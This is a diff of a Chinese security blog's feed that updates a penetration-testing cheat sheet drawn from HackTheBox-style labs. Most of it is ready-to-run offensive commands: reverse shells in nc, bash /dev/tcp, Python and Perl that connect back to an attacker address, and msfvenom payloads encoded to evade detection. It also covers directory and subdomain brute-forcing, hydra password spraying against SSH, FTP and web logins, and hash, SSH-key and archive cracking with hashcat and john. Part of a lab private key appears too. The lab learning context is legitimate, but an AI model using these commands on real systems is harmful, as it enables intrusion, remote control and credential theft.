@@ -7816,16 +7816,20 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 <p>也可以尝试下面的命令。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script -qc /bin/bash /dev/null
 </span></span></code></pre></div><p>script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。</p>
-<h3 id="获得-shell-的一些-反弹-shell">获得 shell 的一些 反弹 shell</h3>
+<h3 id="反弹-shell">反弹 shell</h3>
 <h4 id="linux">Linux</h4>
+<h5 id="现成的反弹-shell">现成的反弹 shell</h5>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -e /bin/bash 10.10.10.5 <span style="color:#ae81ff">4444</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
-</span></span></code></pre></div><h3 id="文件属性和可识别字符">文件属性和可识别字符</h3>
+</span></span></code></pre></div><pre tabindex="0"><code>bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;
+</code></pre><pre tabindex="0"><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
+</code></pre><pre tabindex="0"><code>perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</code></pre><h5 id="msfvenom">Msfvenom</h5>
+<p>Msf 生成反弹 shell</p>
+<pre tabindex="0"><code>sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
+</code></pre><p>生成二进制脚本</p>
+<pre tabindex="0"><code>sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b &#34;\x00&#34; -e x86/shikata_ga_nai -f c
+</code></pre><pre tabindex="0"><code>sudo msfvenom -p linux/x86/exec CMD=&#34;/bin/bash&#34; -b &#34;\x00&#34; -e x86/shikata_ga_nai -f c
+</code></pre><h3 id="文件分析">文件分析</h3>
 <p>在拿到一个文件后可进行如下分析：</p>
 <p><img src="P1.png" alt="P1"></p>
 <p>file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 <code>not stripped</code> 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。</p>
@@ -7846,7 +7850,7 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 </span></span></code></pre></div><p>trans（translate-shell）是很不错的命令行翻译工具。</p>
 <h3 id="idor-不安全直接对象引用">IDOR 不安全直接对象引用</h3>
 <p>IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是一种常见的访问控制漏洞，主要出现在 Web 应用请求的资源未进行有效的权限验证和限制的情况下。具体来说，应用程序通过用户提交的参数（如用户ID、文件名、订单号等）直接引用内部对象，却未验证当前用户是否拥有访问这些对象的权限。这种情况下，攻击者可以通过修改请求的参数值（例如 ID 号）直接访问或操作本不该被访问到的敏感信息或资源，从而实现越权访问。例如，在一个用户个人信息页面中，如果 URL 参数形如 user?id=1，攻击者只需要修改 id 值即可查看其他用户的数据。当开发者未对资源引用和权限做严格验证时，IDOR 漏洞便会产生，攻击者通过简单篡改请求参数即可实现攻击。</p>
-<h3 id="关于文件上传">关于文件上传</h3>
+<h3 id="文件上传">文件上传</h3>
 <p>有些表单原本只可以上传 jpg、git、png 等图片格式文件，为什么最终却可以上传 .phtml 和 .phar 格式文件呢？因为 .phtml 和 .phar 两种文件格式比较特殊，.phtml 是一种 PHP 常规拓展名，早期较为常见，现在虽然使用较少但依旧默认会被 PHP 引擎解析，这使得攻击者能够通过上传该格式的文件直接执行恶意 PHP 代码。而 .phar 更加特殊，它本质上是 PHP 的归档文件格式（PHP Archive），也可以执行。</p>
 <h3 id="添加-hosts-记录">添加 hosts 记录</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.187.74 conversor.htb&#34; &gt;&gt; /etc/hosts&#39;</span>
@@ -7860,8 +7864,96 @@ AvdkbwNKeW1F/CkRpsFkmcc1/cvTrzBueLfuJI/2Cm8RB55xHgkJNtkk9Fc3HLRF8Z/kZC
 Mn8NP3Z2qOuHzSO5yoqU2mFiFBouc56nWkR50JElA2z0L65KU81xDPB3YVujEf/yxbvoxJ
 ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 -----END OPENSSH PRIVATE KEY-----
-</code></pre><p>值得注意的是，下载 <code>id_rsa</code> 是失败的，需要下载 <code>id_ed25519</code>；<code>id_ed25519</code> 是现代 SSH 推荐的 Ed25519 算法私钥文件。</p>
-]]></content></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
+</code></pre><p>值得注意的是，下载 <code>id_rsa</code> 是失败的，需要下载 <code>id_ed25519</code>；<code>id_ed25519</code> 是现代 SSH 推荐的 <code>Ed25519</code> 算法私钥文件。</p>
+<h3 id="爆破相关">爆破相关</h3>
+<h4 id="目录爆破">目录爆破</h4>
+<h5 id="dirb">Dirb</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dirb https://10.10.10.10
+</span></span></code></pre></div><h5 id="gobuster">Gobuster</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,jsp,zip,tar,html,txt,tar,tar.gz,git,js,md
+</span></span></code></pre></div><p>POST 爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://driver.htb -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt
+</span></span></code></pre></div><h5 id="feroxbuster">Feroxbuster</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo feroxbuster -u http://driver.htb -x php -H <span style="color:#e6db74">&#34;Authorization: Basic YWRtaW46YWRtaW4=&#34;</span> 
+</span></span></code></pre></div><h5 id="ffuf">Ffuf</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.230.159:3000/?FUZZ<span style="color:#f92672">=</span>value -fs <span style="color:#ae81ff">81</span>
+</span></span></code></pre></div><h4 id="关于子域名爆破">关于子域名爆破</h4>
+<h5 id="gobuster-1">Gobuster</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster vhost -u http://10.129.230.193 --domain crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k -r -t <span style="color:#ae81ff">100</span>
+</span></span></code></pre></div><ul>
+<li>vhost：指定虚拟主机枚举模式</li>
+<li>&ndash;domain：指定基础域名</li>
+<li>-k：跳过 <code>SSL/TLS</code> 证书验证</li>
+<li>-r：自动跟随重定向</li>
+<li>-t 100：设置并发线程为 100</li>
+</ul>
+<h4 id="ffuf-1">Ffuf</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ffuf -H <span style="color:#e6db74">&#34;Host: FUZZ.soulmate.htb&#34;</span> -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+</span></span></code></pre></div><ul>
+<li>-H：添加自定义 <code>HTTP</code> 请求头</li>
+<li>Host: FUZZ.soulmate.htb：设置 <code>Host</code> 头部</li>
+<li>FUZZ：<code>ffuf</code> 的关键占位符</li>
+<li>-ac：自动校准模式</li>
+</ul>
+<h4 id="暴力破解">暴力破解</h4>
+<h5 id="hashcat">Hashcat</h5>
+<p>破解 <code>MD5</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> hash/hash.lst /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>破解 <code>7z</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">11600</span> -a <span style="color:#ae81ff">0</span> 7z_hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>查看破解过的 <code>hash</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> --show hash/hash.lst
+</span></span></code></pre></div><h5 id="hydra">Hydra</h5>
+<p>破解多个用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L users.txt -P wordlist.txt
+</span></span></code></pre></div><p>破解单个用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;aaa&#34;</span> -P wordlist.txt
+</span></span></code></pre></div><p>破解 Web POST</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;key&#34;</span> -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post <span style="color:#e6db74">&#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34;</span>
+</span></span></code></pre></div><p>FTP 密码喷射</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.35 -f
+</span></span></code></pre></div><p>SSH 密码喷射</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l sword -P passwords.txt ssh://10.10.10.5 -t <span style="color:#ae81ff">30</span> -V
+</span></span></code></pre></div><p>破解登入框</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l shaldon -P password.txt -f 10.10.10.39 -s <span style="color:#ae81ff">80</span> http-get /the_real_secret_dir
+</span></span></code></pre></div><h5 id="ffuf-2">Ffuf</h5>
+<p>破解 Web POST</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 404,401 -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> http://driver.htb
+</span></span></code></pre></div><h5 id="john">John</h5>
+<p>破解 <code>hash</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo john hash/hash.lst --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>破解 <code>id_rsa</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/john/ssh2john.py hash/id_rsa &gt; crack.txt  
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt id_rsa     
+</span></span></code></pre></div><p>破解 7z</p>
+<pre tabindex="0"><code>/usr/share/john/7z2john.py backup.7z &gt; 7z_hash.txt
+</code></pre><pre tabindex="0"><code>john 7z_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre><p>破解 zip</p>
+<pre tabindex="0"><code>sudo /usr/sbin/zip2john flag.zip &gt; flag.txt
+</code></pre><pre tabindex="0"><code>john flag.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre><p>生成更好的字典</p>
+<pre tabindex="0"><code>john -rules -wordlist=password.txt - stdout | sort | uniq &gt; wordlist.txt
+</code></pre><h3 id="共享目录相关">共享目录相关</h3>
+<h4 id="mount">Mount</h4>
+<p>检查共享目录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount -e 10.10.10.13
+</span></span></code></pre></div><p>连接共享目录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mount -t nfs 10.10.10.13:/home/karl attact
+</span></span></code></pre></div><h4 id="smbclient">Smbclient</h4>
+<p>列出 SMB 共享</p>
+<pre tabindex="0"><code>sudo smbclient -N -L \\\\10.10.10.10
+</code></pre><p>连接到 SMB 共享</p>
+<pre tabindex="0"><code>sudo smbclient \\\\10.10.10.10\\enil
+</code></pre><h3 id="缓冲区溢出">缓冲区溢出</h3>
+<h4 id="msf">Msf</h4>
+<p>创建 600 字节缓冲区</p>
+<pre tabindex="0"><code>msf-pattern_crate -l 600
+</code></pre><p>确定字节</p>
+<pre tabindex="0"><code>msf-pattern_offset -l 600 -q 35724134
+</code></pre><p>jum esp</p>
+<pre tabindex="0"><code>msf-nasm_shell
+</code></pre><pre tabindex="0"><code>jmp esp
+</code></pre>]]></content></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
 &lt;h2 id="可能使用到的-cewl-及-john-命令及解释"&gt;可能使用到的 Cewl 及 john 命令及解释&lt;/h2&gt;
 &lt;h3 id="cewl-语句及其解释"&gt;Cewl 语句及其解释&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo cewl http://10.10.10.48 -w password.txt
